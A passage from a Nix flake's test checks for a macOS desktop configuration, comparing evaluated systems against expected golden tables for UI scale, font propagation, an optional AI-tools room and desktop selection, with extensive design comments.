          expectedAccentTable = ''
            bar pinned
            bar-logo moves
            bat pinned
            fzf moves
            ghostty pinned
            glow moves
            helix pinned
            lazygit moves
            lsd pinned
            opencode pinned
            perch moves
            pounce pinned
            starship pinned
            wallpaper moves
            yazi moves
            zed-roster-port moves
            zen moves
          '';

          # Both reach tables below derive their file rows from the WHOLE
          # home-file set on purpose: a surface that starts following the option
          # then shows up as a new row rather than going unnoticed in a curated
          # list. That only works while every file is a subject in its own right.
          #
          # A DERIVED file is not. bar's `.haus-stamp` is a content hash over
          # every other bar file (modules/bar/default.nix), so it moves whenever
          # any of them does — it would earn a row in both tables while measuring
          # nothing, and in every reach-style check written after this one. Named
          # by convention rather than by path so the next derived file inherits
          # the exclusion instead of rediscovering this comment.
          #
          # This is the one exclusion that ADDS signal by removing a row; a file
          # dropped here for any other reason is a hole in the check.
          reachFiles = nixpkgs.lib.filterAttrs (target: _: baseNameOf target != ".haus-stamp");

          # ---- scale-reach ----------------------------------------------------
          # The same treatment as accent-reach, for the other fan-out option —
          # and it needed one word the accent vocabulary doesn't have.
          #
          # `haus.ui.scale` promises three different things, all of which
          # fail silently:
          #
          #   1. it REACHES a specific set of surfaces (terminal type, the
          #      palette, the bar's type, Dock tiles, windows's gaps, Finder's
          #      sidebar). Drop one of those wires in a refactor and nothing
          #      errors — the surface just stops growing with the others, which
          #      is invisible to anyone not running at a scale;
          #   2. it does NOT reach everything else, and that boundary moves as
          #      quietly as the first one;
          #   3. two of the surfaces STOP. The bar's type rises to 1.25x and
          #      holds, because 28pt pills have to stay inside a 32pt menu-bar
          #      band that belongs to macOS (../lib/bar.nix), and pounce clamps
          #      to its own 0.8-2.0 so `ui.scale = 2.5` yields a 2.0 palette
          #      rather than an eval error.
          #
          # Point 3 is why this can't reuse accent-reach's moves/pinned/PARTIAL:
          # a ceiling is neither, and reads as PARTIAL under that vocabulary
          # while being the deliberate answer. So there are FOUR scales here —
          # 1.0, 1.4 (large-print's), and two past every ceiling — and a
          # `ceiling` verdict for a value that changes and then stops. A ceiling
          # that regressed into a plain multiplier, or a multiplier that grew a
          # ceiling, both fail.
          #
          # The numeric rows print the generated NUMBER rather than a verdict,
          # because a golden table should print its own subject (the same lesson
          # preset-composition learned): `19 27 48 57` is checkable by eye and a
          # word like "moves" is not. The file rows are derived from the whole
          # home-file set with the pinned ones dropped, so a surface that STARTS
          # following the scale shows up as a new row rather than going unnoticed
          # in a curated list.
          scaleAt =
            scale:
            let
              cfg =
                (mkHaus {
                  inherit system;
                  username = "you";
                  hostname = "example";
                  extraModules = [ { haus.ui.scale = scale; } ];
                }).config;
              hm = cfg.home-manager.users.you;
              text =
                target:
                let
                  entry = hm.home.file.${target};
                in
                builtins.unsafeDiscardStringContext (
                  if entry.text != null then entry.text else toString entry.source
                );
              # The capture groups of the first line matching `pat`, joined with
              # "/" — so the windows rows can carry both monitors' gaps in one
              # cell. Throws rather than emitting an empty cell if nothing
              # matches: a row whose subject vanished would otherwise keep
              # passing while measuring nothing.
              capture =
                target: pat:
                let
                  hits = builtins.filter (m: m != null) (
                    map (builtins.match pat) (nixpkgs.lib.splitString "\n" (text target))
                  );
                in
                if hits == [ ] then
                  throw "scale-reach: nothing in ${target} matches ${pat} — that row has no subject"
                else
                  builtins.concatStringsSep "/" (builtins.head hits);
              ghostty = "Library/Application Support/com.mitchellh.ghostty/config";
              aerospace = ".config/aerospace/aerospace.toml";
            in
            {
              files = builtins.mapAttrs (target: _: text target) (reachFiles hm.home.file);
              numbers = {
                # The ONE option in the whole surface whose unit is points —
                # `ui.scale` and `launcher.scale` are multipliers, and the other
                # numeric leaves are ids, counts and a percentage.
                "opt fonts.mono.size" = toString cfg.haus.fonts.mono.size;
                "opt launcher.scale" = toString cfg.haus.launcher.scale;
                # Deliberately unset at 1.0: a Dock sized by hand is left alone
                # unless the rice was actually asked to scale (core/default.nix).
                "sys dock.tilesize" =
                  if cfg.system.defaults.dock.tilesize == null then
                    "unset"
                  else
                    toString cfg.system.defaults.dock.tilesize;
                "sys finder.sidebar" = toString cfg.system.defaults.NSGlobalDomain.NSTableViewDefaultSizeMode;
                "gen ghostty font-size" = capture ghostty ".*font-size = ([0-9]+).*";
                "gen pounce scale" = capture ".config/pounce/config.json" ".*\"scale\":([0-9.]+).*";
                # Bracket classes rather than backslashes: these are POSIX
                # extended regexes, where an escaped brace is not a literal.
                "gen windows inner.horizontal" =
                  capture aerospace ".*inner[.]horizontal = [[][{] monitor[.][^=]+= ([0-9]+) [}], ([0-9]+)[]].*";
                # The bar's edge. The built-in is a scaled gap plus bar.room (the
                # notch strip already excludes the bar's height there); the
                # external is `barEdge` — the bar's own HEIGHT plus that same
                # room. A measurement, so it sits at 36 and then rises only by
                # the room, the separation the pill couldn't take vertically once
                # its type hit the ceiling. A number climbing with the scale here
                # would be reserving a band for a bar that never got taller.
                "gen windows outer.top" =
                  capture aerospace ".*outer[.]top = [[][{] monitor[.][^=]+= ([0-9]+) [}], ([0-9]+)[]].*";
                "gen bar FS_ICON" = capture ".config/sketchybar/sizes.sh" ".*FS_ICON=\"([0-9.]+)\".*";
              };
            };
          # Four full evaluations, bound once — the rows are cheap, the systems
          # are not. 2.5 and 3.0 are both past the bar's 1.25 and pounce's 2.0,
          # which is what makes a ceiling distinguishable from a multiplier.
          scaleRuns = map scaleAt [
            1.0
            1.4
            2.5
            3.0
          ];
          scaleVerdict =
            values:
            let
              squashed = builtins.foldl' (
                acc: v: if acc != [ ] && nixpkgs.lib.last acc == v then acc else acc ++ [ v ]
              ) [ ] values;
            in
            if builtins.length squashed == 1 then
              "pinned"
            else if squashed == values && nixpkgs.lib.unique values == values then
              "moves"
            # Changed, then held: it moved on the FIRST step, no value ever comes
            # back after being left, and the top two scales agree. The first-step
            # clause matters — `a a b b` would otherwise read as a tidy ceiling
            # while meaning the surface is dead across 1.0 -> 1.4, which is the
            # only stretch anyone actually runs (large-print IS 1.4). Anything
            # that is neither a clean multiplier nor a clean ceiling is PARTIAL
            # and wants a human.
            else if
              squashed == nixpkgs.lib.unique values
              && builtins.head values != builtins.elemAt values 1
              && nixpkgs.lib.last values == builtins.elemAt values 2
            then
              "ceiling"
            else
              "PARTIAL";
          scaleCell = run: target: run.files.${target} or "(absent)";
          # The UNION of every run's targets, not the 1.0 run's — a file written
          # only above 1.0 (`mkIf (ui.scale != 1.0)`, which is exactly how
          # core writes the Dock tile) exists in no other run's attrNames, so
          # taking the first run's would leave it out of the table entirely and
          # this check would go green on the surface it was built to notice.
          # Merging the attrsets keeps the names sorted; `scaleCell`'s fallback
          # covers the ragged lookups in both directions.
          scaleTargets = builtins.attrNames (builtins.foldl' (acc: run: acc // run.files) { } scaleRuns);
          scaleFileRows = builtins.filter (r: r != null) (
            map (
              target:
              let
                verdict = scaleVerdict (map (run: scaleCell run target) scaleRuns);
              in
              if verdict == "pinned" then null else "file ${target} ${verdict}"
            ) scaleTargets
          );
          scaleNumberRows = map (
            name: "${name} ${builtins.concatStringsSep " " (map (run: run.numbers.${name}) scaleRuns)}"
          ) (builtins.attrNames (builtins.head scaleRuns).numbers);
          scaleTable = builtins.concatStringsSep "\n" (scaleNumberRows ++ scaleFileRows);
          # Numbers first, then every home file that isn't byte-identical across
          # all four scales. Both halves self-sort (`attrNames`), so nothing can
          # be added in a spot that hides it.
          expectedScaleTable = ''
            gen bar FS_ICON 17.0 21.0 21.0 21.0
            gen ghostty font-size 19 27 48 57
            gen pounce scale 1.0 1.4 2.0 2.0
            gen windows inner.horizontal 10/20 14/28 25/50 30/60
            gen windows outer.top 10/36 24/46 35/46 40/46
            opt fonts.mono.size 19 27 48 57
            opt launcher.scale 1.000000 1.400000 2.000000 2.000000
            sys dock.tilesize unset 67 120 144
            sys finder.sidebar 1 3 3 3
            file .claude/skills/haus/references/this-machine.md moves
            file .config/aerospace/aerospace.toml moves
            file .config/haus/term/float-term.sh moves
            file .config/opencode/skills/haus/references/this-machine.md moves
            file .config/pounce/config.json ceiling
            file .config/sketchybar/sizes.sh ceiling
            file .config/sketchybar/top_items.sh ceiling
            file .config/sketchybar/tour_item.sh ceiling
            file .config/sketchybar/workspaces.sh ceiling
            file Library/Application Support/com.mitchellh.ghostty/config moves
          '';

          # ---- font-reach -----------------------------------------------------
          # The third "this option reaches exactly these things" table, and the
          # one with a story: `haus.fonts.mono.name` used to reach ONE
          # surface. The bar named "Hack Nerd Font" in its rc, four plugins and
          # six generated blocks, so a rice that changed the family got a machine
          # with two of them — and nothing said so, because a font option's reach
          # is invisible until you change it and look at the result.
          #
          # Two families rather than accent-reach's three: there is no ceiling
          # here and no partial-arrival case that a third value would catch. The
          # rows that matter most are the PINNED one — the workspace-logo glyphs
          # are sketchybar-app-font, bar's own, and must not follow the rice —
          # and the two halves of that sentence coming from the same generated
          # file.
          #
          # ★ And the second story, which is about this check rather than the
          # bar: A REACH TABLE THAT VARIES ONE OPTION IS BLIND TO ANYTHING BEHIND
          # A SECOND ONE. The clock pill's label has two branches
          # (modules/bar/default.nix), and every system below leaves
          # `bar.clock.monoFont` at its `true` default — so the other branch was
          # never evaluated here, and a hardcoded ".AppleSystemUIFont" landed in
          # it (#330) without this check noticing, which is the one check whose
          # entire job is finding hardcoded families. The literal was a day old
          # when it was found, so the cost was luck rather than time: nothing
          # here would have reported it in a year.
          # No pattern would have caught it; the fix is a THIRD PAIR of
          # systems with the second key flipped (`sansAt`). Ask it of every
          # golden table here: which conditional does my sample never enter?
          fontAt =
            extra:
            let
              cfg =
                (mkHaus {
                  inherit system;
                  username = "you";
                  hostname = "example";
                  extraModules = [
                    {
                      # Named, not evaluated: a family with no package warns, and
                      # a check that evaluates a warning is measuring the warning.
                      haus.fonts.mono.packageName = "nerd-fonts.fira-code";
                    }
                    # A module, not `//`: a shallow merge of two nested attrsets
                    # would drop the packageName above rather than combine with
                    # it, silently measuring the warning this check avoids.
                    extra
                  ];
                }).config;
              hm = cfg.home-manager.users.you;
              text =
                target:
                let
                  entry = hm.home.file.${target};
                in
                builtins.unsafeDiscardStringContext (
                  if entry.text != null then entry.text else toString entry.source
                );
              capture =
                target: pat:
                let
                  hits = builtins.filter (m: m != null) (
                    map (builtins.match pat) (nixpkgs.lib.splitString "\n" (text target))
                  );
                in
                if hits == [ ] then
                  throw "font-reach: nothing in ${target} matches ${pat} — that row has no subject"
                else
                  builtins.concatStringsSep "/" (builtins.head hits);
              # Five pills in modules/bar/default.nix can write `label.font=`
              # into this file once `bar.items` names them, so a first-hit
              # capture would be measuring whichever one bar emits first. Today
              # the anchor is NOT load-bearing — measured, by widening it to `.*`
              # and watching the row still pass — and for a weaker reason than
              # ordering: the example system does emit a second `label.font=`
              # (weather's popup) but it is `:Regular`, so this row's pattern has
              # exactly one candidate. It stays anchored because that is a
              # property of the SAMPLE, not of the bar: one more enabled item
              # with a Bold label, or one reorder, and an unanchored row measures
              # another pill while staying green.
              captureAfter =
                target: anchor: pat:
                let
                  lines = nixpkgs.lib.splitString "\n" (text target);
                  anchored = builtins.filter (i: builtins.match anchor (builtins.elemAt lines i) != null) (
                    nixpkgs.lib.range 0 (builtins.length lines - 1)
                  );
                  from = if anchored == [ ] then [ ] else nixpkgs.lib.drop (builtins.head anchored) lines;
                  hits = builtins.filter (m: m != null) (map (builtins.match pat) from);
                in
                if from == [ ] then
                  throw "font-reach: no line in ${target} matches the anchor ${anchor}"
                else if hits == [ ] then
                  throw "font-reach: nothing after ${anchor} in ${target} matches ${pat}"
                else
                  builtins.concatStringsSep "/" (builtins.head hits);
            in
            {
              files = builtins.mapAttrs (target: _: text target) (reachFiles hm.home.file);
              names = {
                "gen ghostty font-family" =
                  capture "Library/Application Support/com.mitchellh.ghostty/config" ".*font-family = (.*)";
                "gen bar BAR_FONT" = capture ".config/sketchybar/sizes.sh" ".*BAR_FONT=\"(.*)\".*";
                "gen bar workspace letter" = capture ".config/sketchybar/workspaces.sh" ".*IFONT=\"([^:]+):Bold.*";
                "gen bar workspace logo" =
                  capture ".config/sketchybar/workspaces.sh" ".*IFONT=(sketchybar-app-font):Regular.*";
                "gen bar clock label" =
                  captureAfter ".config/sketchybar/top_items.sh" ".*--set clock.*"
                    ".*label\\.font=\"([^:]+):Bold.*";
              };
            };
          # The generated half of the bar can only be measured by evaluating it.
          # The STATIC half — the rc and the plugins, copied to the machine and
          # read at runtime — is where the two-fonts bug actually lived, and no
          # amount of evaluating two rices can see it: those files are identical
          # whatever family the rice names. So one more row, read straight off
          # the source: how many lines still name a font family literally. It is
          # 0, and the next hardcoded "Whatever Nerd Font:" makes it 1.
          barStaticHardcodedFonts =
            let
              dir = ./modules/bar/sketchybar;
              plugins = builtins.attrNames (builtins.readDir (dir + "/plugins"));
              files = [ (dir + "/sketchybarrc") ] ++ map (f: dir + "/plugins" + "/${f}") plugins;
              lines = builtins.concatLists (map (f: nixpkgs.lib.splitString "\n" (builtins.readFile f)) files);
            in
            builtins.length (builtins.filter (l: builtins.match ".*[A-Za-z] Nerd Font:.*" l != null) lines);
          fontA = fontAt { haus.fonts.mono.name = "JetBrainsMono Nerd Font Mono"; };
          fontB = fontAt { haus.fonts.mono.name = "FiraCode Nerd Font"; };
          # The third pair: the branch the two above never enter. Both keys move
          # together on purpose — `fonts.sans.name` has exactly one reader and it
          # is behind `clock.monoFont = false`, so a pair that varied only the
          # family would produce two identical machines and call that a reach.
          sansAt =
            name:
            fontAt {
              haus.bar.clock.monoFont = false;
              haus.fonts.sans.name = name;
            };
          sansA = sansAt ".AppleSystemUIFont";
          sansB = sansAt "Atkinson Hyperlegible";
          fontFileRows = builtins.filter (r: r != null) (
            map (
              target:
              let
                a = fontA.files.${target} or "(absent)";
                b = fontB.files.${target} or "(absent)";
              in
              if a == b then null else "file ${target} moves"
            ) (builtins.attrNames (fontA.files // fontB.files))
          );
          fontNameRows = map (name: "${name} ${fontA.names.${name}} | ${fontB.names.${name}}") (
            builtins.attrNames fontA.names
          );
          sansFileRows = builtins.filter (r: r != null) (
            map (
              target:
              let
                a = sansA.files.${target} or "(absent)";
                b = sansB.files.${target} or "(absent)";
              in
              if a == b then null else "sans file ${target} moves"
            ) (builtins.attrNames (sansA.files // sansB.files))
          );
          # One name row and the file rows under it: the family the clock draws,
          # and the complete list of files a proportional family reaches. That
          # list being short IS the claim — `fonts.sans` is one label, and the
          # option's own description says so.
          sansNameRow = "sans gen bar clock label ${sansA.names."gen bar clock label"} | ${
            sansB.names."gen bar clock label"
          }";
          fontTable = builtins.concatStringsSep "\n" (
            fontNameRows
            ++ [ "static bar hardcoded-family-literals ${toString barStaticHardcodedFonts}" ]
            ++ fontFileRows
            ++ [ sansNameRow ]
            ++ sansFileRows
          );
          expectedFontTable = ''
            gen bar BAR_FONT JetBrainsMono Nerd Font Mono | FiraCode Nerd Font
            gen bar clock label JetBrainsMono Nerd Font Mono | FiraCode Nerd Font
            gen bar workspace letter JetBrainsMono Nerd Font Mono | FiraCode Nerd Font
            gen bar workspace logo sketchybar-app-font | sketchybar-app-font
            gen ghostty font-family JetBrainsMono Nerd Font Mono | FiraCode Nerd Font
            static bar hardcoded-family-literals 0
            file .claude/skills/haus/references/this-machine.md moves
            file .config/opencode/skills/haus/references/this-machine.md moves
            file .config/sketchybar/sizes.sh moves
            file .config/sketchybar/top_items.sh moves
            file .config/sketchybar/tour_item.sh moves
            file .config/sketchybar/workspaces.sh moves
            file Library/Application Support/com.mitchellh.ghostty/config moves
            sans gen bar clock label .AppleSystemUIFont | Atkinson Hyperlegible
            sans file .config/sketchybar/top_items.sh moves
          '';

          # ---- ai-room ---------------------------------------------------------
          # The AI room is the first room declared as a CROSS-ROOM CAPABILITY
          # (notes/rooms-desktops.md), and the claim it makes is behavioural, not
          # structural: turning it on brings its own clients and `holt` whatever
          # else the machine has, and what it adds to the terminal, the bar and
          # the launcher arrives only with those rooms. A comment cannot hold
          # that; six evaluated machines can.
          #
          # Every row below is read off a REAL evaluated system rather than off
          # the option that produced it, because the failure this guards against
          # is precisely a contribution that is decided in one place and drawn in
          # another. `holt` is a system package, a client is a home one, the
          # alias is the terminal's, the pill is a generated bar file and the
          # cards are the launcher's JSON — five different plumbings, one table.
          aiRoomAt =
            extraModules:
            let
              cfg =
                (mkHaus {
                  inherit system extraModules;
                  username = "you";
                  hostname = "example";
                }).config;
              hm = cfg.home-manager.users.you;
              named = pkg: pkg.pname or pkg.name or "";
              hasPkg = list: name: builtins.any (p: nixpkgs.lib.hasInfix name (named p)) list;
              fileText =
                target:
                let
                  entry = hm.home.file.${target} or null;
                in
                if entry == null then
                  ""
                else
                  builtins.unsafeDiscardStringContext (
                    if entry.text != null then entry.text else toString entry.source
                  );
              yn = b: if b then "yes" else "no";
            in
            {
              inherit cfg;
              # The room's own payload: does this machine get the worktree tool
              # and at least one client, whatever else it has?
              holt = yn (hasPkg cfg.environment.systemPackages "holt");
              client = yn (hasPkg hm.home.packages "claude-code");
              # What it contributes, as each receiving room actually rendered it.
              alias = hm.programs.zsh.shellAliases.c or "(none)";
              pill = yn (nixpkgs.lib.hasInfix "agents" (fileText ".config/sketchybar/top_items.sh"));
              cards = yn (nixpkgs.lib.hasInfix "Agent Worktrees" (fileText ".config/pounce/cheatsheet.json"));
            };
          aiRoomFixtures = {
            # The rice as shipped: every receiver present, so every contribution
            # should be drawn.
            hacker = [ ];
            # The room ALONE. No bar, no launcher — the clients and `holt` must
            # still arrive, and nothing may fail for want of a receiver. It ASKS
            # for the pill: a request whose receiving room is absent has to be
            # inert, not an error.
            "ai-alone" = [
              {
                haus.bar.enable = false;
                haus.launcher.enable = false;
                haus.bar.items.agents = true;
              }
            ];
            # One receiver at a time, to prove the contributions are independent
            # rather than all riding on one room being present.
            "ai-with-bar" = [
              {
                haus.launcher.enable = false;
                haus.bar.items.agents = true;
              }
            ];
            "ai-with-launcher" = [ { haus.bar.enable = false; } ];
            # The room off, with every receiver present: the receivers keep their
            # own features and lose only what AI was contributing.
            "ai-off" = [ { haus.ai.enable = false; } ];
            # A bar asked for a pill whose room is off. The pill is left out
            # rather than drawn dormant, and the AI room says so by name — the
            # warning is asserted separately below.
            "pill-without-ai" = [
              {
                haus.ai.enable = false;
                haus.bar.items.agents = true;
              }
            ];
            # The SECOND bar asking for the same pill. A separate fixture because
            # the two bars are filtered through one predicate but were nearly
            # warned about through two: a menu-bar-only warning would have left
            # the bottom bar silently dropping the pill, which is the failure the
            # warning exists to end.
            "bottom-pill-without-ai" = [
              {
                haus.ai.enable = false;
                haus.bar.bottom.enable = true;
                haus.bar.bottom.items.agents = "left";
              }
            ];
            # The room on with NO client installed by the rice. `ai.clients`
            # empty means the rice installs none, not that no agent runs here —
            # a Claude Code from npm still reports panes through `agent-state`,
            # which follows the room's switch. So the pill stays and the chords
            # go: nothing would spawn from a chord, but something can report.
            "no-rice-clients" = [
              {
                haus.ai.clients = [ ];
                haus.bar.items.agents = true;
              }
            ];
          };
          aiRoomTable = builtins.concatStringsSep "\n" (
            map (
              name:
              let
                r = aiRoomAt aiRoomFixtures.${name};
              in
              "${name} holt=${r.holt} client=${r.client} alias=${r.alias} pill=${r.pill} cards=${r.cards}"
            ) (builtins.attrNames aiRoomFixtures)
          );
          # `hacker pill=no` is not a miss: the rice ships the agents pill OFF
          # (it is an extra, like every personal readout), and a host turns it on.
          # The fixtures that exercise the seam ask for it explicitly.
          expectedAiRoomTable = ''
            ai-alone holt=yes client=yes alias=claude pill=no cards=no
            ai-off holt=no client=no alias=(none) pill=no cards=no
            ai-with-bar holt=yes client=yes alias=claude pill=yes cards=no
            ai-with-launcher holt=yes client=yes alias=claude pill=no cards=yes
            bottom-pill-without-ai holt=no client=no alias=(none) pill=no cards=no
            hacker holt=yes client=yes alias=claude pill=no cards=yes
            no-rice-clients holt=yes client=no alias=(none) pill=yes cards=no
            pill-without-ai holt=no client=no alias=(none) pill=no cards=no
          '';

          # There is no old-address fixture, on purpose: `haus.agents.*` and
          # `haus.developer.agents.enable` were removed rather than aliased (see
          # modules/moved.nix), so the only proof worth having is that the old
          # spellings no longer evaluate at all — which is what the module system
          # does for free, by refusing an option that does not exist.
          #
          # The dormant-pill warning, which has to name BOTH rooms: the one that
          # asked and the one that is missing. Checked as a whole list so a second
          # warning can't slip in beside it unnoticed.
          aiPillWarning =
            asking:
            "${asking} asks for the agents pill, but the AI room is off "
            + "(haus.ai.enable). "
            + "Nothing writes agent-pane state on this machine, so the pill would stay dormant "
            + "forever and the bar leaves it out.";
          aiPillWarnings = (aiRoomAt aiRoomFixtures."pill-without-ai").cfg.warnings;
          expectedAiPillWarnings = [ (aiPillWarning "haus.bar.items.agents") ];
          # The bottom bar's own row. Its warning list carries the pre-existing
          # empty-strip warning too — the second bar really does end up with
          # nothing on it — so both are asserted, in order, rather than filtered.
          aiBottomPillWarnings = (aiRoomAt aiRoomFixtures."bottom-pill-without-ai").cfg.warnings;
          expectedAiBottomPillWarnings = [
            (
              "haus.bar.bottom.enable is on but no pill lands on the second bar — nothing in "
              + "haus.bar.bottom.items, or the rooms behind the pills it names are off — so it "
              + "draws an empty strip and still reserves room at the bottom of every display."
            )
            (aiPillWarning "haus.bar.bottom.items.agents")
          ];

          # A standalone `darwinModules` import, as a consumer would make it:
          # nix-darwin plus home-manager plus the one exported partial, with NO
          # builder and therefore no desktop. A function rather than an inline
          # map because the desktop-seam check below evaluates one of these too,
          # to prove that entry point still needs no desktop selection.
          standaloneSystem =
            extraModules:
            let
              username = "you";
              hostname = "example";
            in
            inputs.nix-darwin.lib.darwinSystem {
              inherit system;
              specialArgs = { inherit inputs username hostname; };
              modules = [
                {
                  nixpkgs.hostPlatform = system;
                  nixpkgs.config.allowUnfree = true;
                  system.primaryUser = username;
                  system.stateVersion = 7;
                }
                {
                  nixpkgs.overlays = [
                    pounce.overlays.default
                    perch.overlays.default
                    holt.overlays.default
                  ];
                }
                home-manager.darwinModules.home-manager
                {
                  users.users.${username} = {
                    name = username;
                    home = "/Users/${username}";
                  };
                  home-manager.useGlobalPkgs = true;
                  home-manager.useUserPackages = true;
                  home-manager.users.${username}.home.stateVersion = "24.11";
                  home-manager.extraSpecialArgs = {
                    inherit username inputs;
                    nebelung = {
                      themes = nebelung.packages.${system}.default;
                      palette = nebelung.palette;
                      palettes = nebelung.palettes;
                      ports = nebelung.ports or { };
                    };
                  };
                  home-manager.sharedModules = [
                    catppuccin.homeModules.catppuccin
                    nix-index-database.homeModules.nix-index
                  ];
                }
              ]
              ++ extraModules;
            };
          standaloneEvaluated = map (
            name:
            "${name} ${
              builtins.unsafeDiscardStringContext (standaloneSystem [ self.darwinModules.${name} ]).system.drvPath
            }"
          ) registeredExports;

          # The same exports again, evaluated WITHOUT `hostname` in specialArgs.
          #
          # `standaloneSystem` above passes both `username` and `hostname`,
          # because the full builders do. A bare `darwinModules.*` import does
          # NOT: the consumer writes their own `darwinSystem` call and passes
          # whatever they please, and nothing in the exported surface documents
          # `hostname` as required. So the table above cannot see a module in
          # the shared foundation making it mandatory — which is exactly what
          # happened when the AI room took its payload and named `hostname` in
          # its argument set: `darwinModules.windows`, nothing to do with coding
          # agents, started failing with `attribute 'hostname' missing`. Two
          # more modules (terminal, launcher) had had the same bug for longer.
          #
          # Only `username` is passed here, because that one IS load-bearing —
          # the foundation writes `users.users.${username}` — and a consumer
          # cannot avoid supplying it. Anything else a foundation module wants
          # must have a fallback, and this table is what says so.
          standaloneNoHostname = map (
            name:
            "${name} ${
              builtins.unsafeDiscardStringContext
                (inputs.nix-darwin.lib.darwinSystem {
                  inherit system;
                  specialArgs = {
                    inherit inputs;
                    username = "you";
                  };
                  modules = [
                    {
                      nixpkgs.hostPlatform = system;
                      nixpkgs.config.allowUnfree = true;
                      system.primaryUser = "you";
                      system.stateVersion = 7;
                      users.users.you = {
                        name = "you";
                        home = "/Users/you";
                      };
                      nixpkgs.overlays = [
                        pounce.overlays.default
                        perch.overlays.default
                        holt.overlays.default
                      ];
                    }
                    home-manager.darwinModules.home-manager
                    {
                      home-manager.useGlobalPkgs = true;
                      home-manager.useUserPackages = true;
                      home-manager.users.you.home.stateVersion = "24.11";
                      home-manager.extraSpecialArgs = {
                        inherit inputs;
                        username = "you";
                        nebelung = {
                          themes = nebelung.packages.${system}.default;
                          palette = nebelung.palette;
                          palettes = nebelung.palettes;
                          ports = nebelung.ports or { };
                        };
                      };
                      home-manager.sharedModules = [
                        catppuccin.homeModules.catppuccin
                        nix-index-database.homeModules.nix-index
                      ];
                    }
                    self.darwinModules.${name}
                  ];
                }).system.drvPath
            }"
          ) registeredExports;

          # ---- desktop-seam ----------------------------------------------------
          # Step 3 of the workshop's notes/rooms-desktops.md: a host selects
          # EXACTLY ONE desktop, a desktop is data with a closed shape, and the
          # person who chose it still wins with a plain assignment.
          #
          # Two halves, because the seam has two failure modes that look nothing
          # alike. The first table is behavioural — real evaluated machines,
          # read back through the options a desktop set, so "the desktop won
          # over the room's default and lost to the host" is measured rather
          # than reasoned about. The second is the diagnostics: every way a file
          # can fail to be a desktop, with the message it actually produces.
          # That one exists because a refusal nobody can read is a refusal that
          # gets worked around — and because the FILENAME inside it is the thing
          # a wrapper drops first (`lib.pack` learned that the hard way).
          desktopDir = ./test/desktops;
          desktopFixtures = builtins.filter (n: nixpkgs.lib.hasSuffix ".nix" n) (
            builtins.attrNames (builtins.readDir desktopDir)
          );
          desktopFixture = name: desktopDir + "/${name}";
          # Under `nix flake check` these paths are /nix/store paths that change
          # with every commit, so the tables would rot on contents they don't
          # test. Root-relative keeps the part that matters — which file.
          desktopHere = builtins.replaceStrings [ "${toString ./.}/" ] [ "" ];
          desktopValidNames = builtins.filter (nixpkgs.lib.hasPrefix "valid-") desktopFixtures;
          desktopBadNames = builtins.filter (n: !(nixpkgs.lib.hasPrefix "valid-" n)) desktopFixtures;

          desktopConfig =
            args:
            (mkHaus (
              {
                inherit system;
                username = "you";
                hostname = "example";
              }
              // args
            )).config;
          desktopSelection =
            cfg:
            let
              sources = map desktopHere cfg.haus._desktop.sources;
            in
            if sources == [ ] then "(none)" else builtins.concatStringsSep "+" sources;
          desktopReadback =
            cfg:
            "scale=${toString cfg.haus.ui.scale}"
            + " bar=${if cfg.haus.bar.enable then "yes" else "no"}"
            + " internal=${toString (cfg.haus.displays.internal.uiScale or "(unset)")}"
            + " list=${
               if cfg.haus.launcher.autoQuit.exclude == null then
                 "(unset)"
               else
                 builtins.concatStringsSep "+" cfg.haus.launcher.autoQuit.exclude
             }"
            # Both halves of the editor pair. The desktop may only set the NAME,
            # so a row reading `neovim/nvim` is the derived command arriving
            # through the seam — and `helix/hx` everywhere else is the room's
            # own default, unmoved.
            + " editor=${cfg.haus.terminal.editorName}/${cfg.haus.terminal.editor}"
            + " desktop=${desktopSelection cfg}";
          desktopRows = {
            # The built-in from-scratch choice. It selects a desktop like every
            # finished host does, but that desktop asks for no optional room.
            blank = desktopConfig { desktop = desktopFiles.blank; };
            # No `desktop` argument at all: every existing consumer's call, which
            # has always meant "the hacker machine" and now says so.
            builder-default = desktopConfig { };
            # One desktop, through the full builder. Every value it sets has to
            # reach the evaluated system.
            one-desktop = desktopConfig { desktop = desktopFixture "valid-sample.nix"; };
            # The same desktop, plus a host that disagrees — with a PLAIN
            # assignment, no `lib.mkForce`. This row is the whole priority
            # ladder: 1.5 means the host won, and `bar=yes` means the rest of
            # the desktop survived the override rather than being replaced by it.
            host-override = desktopConfig {
              desktop = desktopFixture "valid-sample.nix";
              extraModules = [ { haus.ui.scale = 1.5; } ];
            };
            # A LIST the host also names. Lists normally concatenate, and this
            # seam deliberately makes them replace instead (modules/lib/desktop.nix's
            # `prioritize` says why): `list=from-host` alone is the claim, and
            # the row is here so step 4 cannot move a real list into a desktop
            # and discover the semantics afterwards.
            list-override = desktopConfig {
              desktop = desktopFixture "valid-sample.nix";
              extraModules = [ { haus.launcher.autoQuit.exclude = [ "from-host" ]; } ];
            };
            # The OTHER way to select one: by hand, through `extraModules`,
            # which is what a consumer composing their own does. `desktop = null`
            # is the half that is easy to miss — without it the builder's own
            # default is the second desktop.
            by-hand = desktopConfig {
              desktop = null;
              extraModules = [ (riceLib.desktop (desktopFixture "valid-other.nix")) ];
            };
            # No desktop at all. The values fall back to what the rooms
            # themselves default to, which is what proves the rows above were the
            # desktop's doing.
            no-desktop = desktopConfig { desktop = null; };
          };
          desktopTable = builtins.concatStringsSep "\n" (
            map (name: "${name} ${desktopReadback desktopRows.${name}}") (builtins.attrNames desktopRows)
          );
          expectedDesktopTable = ''
            blank scale=1.000000 bar=no internal=(unset) list=(unset) editor=helix/hx desktop=desktops/blank.nix
            builder-default scale=1.000000 bar=yes internal=(unset) list=(unset) editor=helix/hx desktop=desktops/hacker.nix
            by-hand scale=1.100000 bar=no internal=(unset) list=(unset) editor=helix/hx desktop=test/desktops/valid-other.nix
            host-override scale=1.500000 bar=yes internal=larger-text list=from-desktop-a+from-desktop-b editor=neovim/nvim desktop=test/desktops/valid-sample.nix
            list-override scale=1.350000 bar=yes internal=larger-text list=from-host editor=neovim/nvim desktop=test/desktops/valid-sample.nix
            no-desktop scale=1.000000 bar=no internal=(unset) list=(unset) editor=helix/hx desktop=(none)
            one-desktop scale=1.350000 bar=yes internal=larger-text list=from-desktop-a+from-desktop-b editor=neovim/nvim desktop=test/desktops/valid-sample.nix
          '';

          blankConfig = desktopRows.blank;
          blankSelections =
            builtins.filter
              (
                name:
                {
                  ai = blankConfig.haus.ai.enable || blankConfig.haus.ai.clients != [ ];
                  apps = blankConfig.haus.apps.videoPlayer.enable;
                  security = blankConfig.haus.security.touchId.enable;
                  development = blankConfig.haus.developer.enable;
                  focus = blankConfig.haus.focus.enable;
                  launcher = blankConfig.haus.launcher.enable;
                  shelf = blankConfig.haus.shelf.enable;
